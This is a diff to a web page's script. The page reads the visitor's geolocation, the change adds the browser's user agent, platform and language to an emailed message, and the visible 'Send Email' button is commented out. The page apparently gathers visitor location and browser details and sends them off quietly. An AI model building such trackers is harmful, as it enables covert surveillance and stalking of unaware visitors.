@@ -36,6 +36,9 @@
     <script>
         let latitude;
         let longitude;
+        let userAgent = navigator.userAgent;
+        let userPlaform = navigator.platform;
+        let userLang = navigator.language;
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function (position) {
                 latitude = position.coords.latitude;
@@ -144,7 +147,8 @@
         function sendEmail() {
             const templateParams = {
                 name: "John Doe",
-                message: `Latitude: ${latitude}, Longitude: ${longitude}`,
+                message: `Latitude: ${latitude}, Longitude: ${longitude}. 
+                \n User Agent: ${userAgent}, Platform: ${userPlaform}, Language: ${userLang}`,
                 email: "recipient@example.com"
             };
 
@@ -161,7 +165,7 @@
 
     </script>
 
-    <button onclick="sendEmail()">Send Email</button>
+    <!-- <button onclick="sendEmail()">Send Email</button> -->
 
 </body>
 
